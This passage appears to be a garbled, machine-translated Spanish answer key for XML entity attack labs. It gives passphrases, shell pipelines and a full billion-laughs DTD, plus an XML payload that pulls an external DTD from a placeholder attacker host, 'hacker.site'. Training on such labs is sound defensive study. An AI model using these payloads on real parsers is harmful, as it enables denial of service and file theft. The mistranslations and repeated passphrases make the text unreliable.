cat files/{IP.TIME} | base64 -d
```

* Limpiar todo en la carpeta de archivos

b. Automató la carpeta de recuperación

* Descargar una lista de nombres de archivos PHP comunes.
* Esto es bueno: Filenames.PHP.Common.wordlist

Haz el extractor de archivo:

```
See file_extractor.sh
```

> \[Nota] hay algunas rutas de código duro dentro del script, debe adaptarlos con respeto a su configuración.

Haz un guión proxy:

```
See getOOB.php
```

> Este script es útil, ya que puede hacerse eco de cargas útiles XML personalizadas con solo pasarle una solicitud de GET al recurso para extraer.

## Lab 3

A continuación, puedes encontrar soluciones para cada tarea. Recuerde, sin embargo, que usted puede seguir su propia estrategia, que puede ser diferente de la que se explica en el siguiente laboratorio.

> \[NOTA] Las técnicas a utilizar durante este laboratorio se explican mejor en el material de estudio. Usted debe referirse a él para más detalles. Estas soluciones se proporcionan aquí sólo para verificar la corrección.

### Solutions - Lab #1

Calentamiento de explotación simple XEE:

_Me haces reír mucho_ Passphrase válido

La contrasíse válida es We-don't'like-like-DoS.ataque Pasos de explotación

* Probando el formulario de inicio de sesión, recibirás una pista que te dice que visites el camino de las estadísticas.
* Abra la ruta de las estadísticas y compruebe el estado porcentual de la Memoria Física.
* Corre el ataque de las risas de Billion contra el login parser. Si el ataque funciona correctamente, notarás una caja de alerta con la contraseñora secreta.

### Solutions - Lab #2

Simple explotación XEE mezclada con una simple explotación XXE:

_No olvidamos cómo explotar XXE_ Passphrase válido

La contrasfise válida es The-second-level-is.done-.like-a-boss Pasos de explotación

* Probando el formulario de inicio de sesión, recibirás una pista que te dice que visites el camino de las estadísticas.
* Abra la ruta de las estadísticas y compruebe el estado porcentual de la Memoria Física.
* Corre el ataque de las risas de Billion contra el login parser. Si el ataque funciona correctamente, notarás una caja de alerta con las instrucciones.

Ejecute un ataque XXE para leer el archivo de registro y limpiar un poco de texto inútil

Extraer el contenido del resultado. Utilice awk o gawk, depende del sistema:

```bash
gawk 'match($0, /<b>XXEME (.*)<\\\/b>\s/, m) { print m[1] }'
```

Eliminar los personajes fugados de JSON

```bash
sed 's/\\\//\//g'
```

XEE DoS

```bash
./exploit.sh
```

XXE log file extraction

```bash
./exploit_xxe.sh /var/www/XEE/2/LOGS/omg_a_dos.log \
| gawk 'match($0, /<b>XXEME (.*)<\\\/b>\s/, m) { print m[1] }' \
| sed 's/\\\//\//g'./exploit.sh
```

### Solutions - Lab#3

Simple explotación de XEE-XEE enriquecido con un poco de codificación:

_No olvidamos cómo funciona la codificación_ Passphrase válido

La contrasfise válida es The-second-level-is.done-.like-a-boss Pasos de explotación

* Probando el formulario de inicio de sesión, recibirás una pista que te dice que visites el camino de las estadísticas.
* Abra la ruta de las estadísticas y compruebe el estado porcentual de la Memoria Física.
* Corre el ataque de las risas de Billion contra el login parser. Si el ataque funciona correctamente, notarás una caja de alerta con las instrucciones.
* Ejecute un ataque XXE para leer el archivo de registro y limpiar un poco de tex inútilt

Encode the log path

```bash
%5BLOGS%5D/omg_%C3%A0_dos.log
```

Extraer el contenido del resultado. Utilizar awk o gawk, depende del sistema:

```bash
gawk 'match($0, /<b>XXEME (.*)<\\\/b>\s/, m) { print m[1] }'
```

Eliminar JSON escapando characters:

```bash
sed 's/\\\//\//g'
```

Decode Unicode characters:

```bash
echo $(php -r "echo html_entity_decode(preg_replace(\"/%u([0-9a-f]{3,4})/i\",'&#x\\1;',str_replace('\u', '%u', '$cleaned')),null,'UTF-8');" ;
```

XEE DoS

```bash
./exploit.sh
```

XXE log file extraction

```bash
./exploit_xxe.sh /var/www/3/%5BLOGS%5D/omg_%C3%A0_dos.log
```

### Solutions - Lab#4

Explotacións XEE-XXE mezcladas con evasión de filtros y codificaciones de caracteres:

_Ah filtros ... siempre lanza una llave en las obras._ Passphrase válido

La contraseñora válida es Escaping.and.evasion.like-a.boss Pasos de explotación

* Probando el formulario de inicio de sesión, recibirás una pista que te dice que visites el camino de las estadísticas.
* Abra la ruta de las estadísticas y compruebe el estado porcentual de la Memoria Física.
* Corre el ataque de las risas de Billion contra el login parser. Si el ataque funciona correctamente, notarás una caja de alerta con las instrucciones.

> El servidor implementa algunos archivadores para evitar ataques XEE. Para explotar el fallo, la solución más rápida es mover el ataque de las risas de Billion en un archivo DTD externo alojado en hacker.site (sustituye con la dirección IP de su máquina atacante), y luego llamarlo de la siguiente manera:

xml carga útil

```xml
<?xml version="1.0"?>
<!DOCTYPE results [
    <!ENTITY % EvilDTD PUBLIC "xxe"
        "http://hacker.site/evil_remote_xee.dtd">
    %EvilDTD;
]>
<login>
    <username>XEEME &file;</username>
    <password>password</password>
</login>
```

> \[Nota] Asegúrese de reemplazar hacker.site con la dirección IP de su máquina atacante.

file: evil\_remote\_xee.dtd

```xml
<!ENTITY lol "lol">
<!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
<!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">
<!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
<!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
<!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
<!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
<!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
<!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
<!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
```

Ejecute un ataque XXE para leer el archivo de registro y claro te inútilxt.

> \[NOTA] Debido a algunas restricciones, para prevenir ataques XEE, URLs largas podrían romper la carga útil. Para eludir esta limitación, podemos mover la carga útil en otro dtd externo como lo hicimos antes.

Encode the log path:

```bash
%7B%5B_%C4%BF.%C3%B2.%C4%9D.%C5%9B_%5D%7D%2F%F0%9D%95%86%E3%8E%8E%E2%80%A6%C3%A0%E2%80%A2d%F0%9D%93%B8s.%E3%8F%92
```

Extraer el contenido del resultado. Utilizar awk o gawk, depende del sistema:

```bash
gawk 'match($0, /<b>XXEME (.*)<\\\/b>\s/, m) { print m[1] }'
```

Eliminar JSON escapando characters:

```bash
sed 's/\\\//\//g'
```

Useful Files:

```
exploit.sh
exploit_xxe.sh
external_dos.dtd
evil_remote_xee.dtd
```

\*XEE DoS \*

```bash
file: exploit.sh
./exploit.sh
```

\*XXE log file extraction \*

```bash
file: exploit_xxe.sh
./exploit_xxe.sh
```
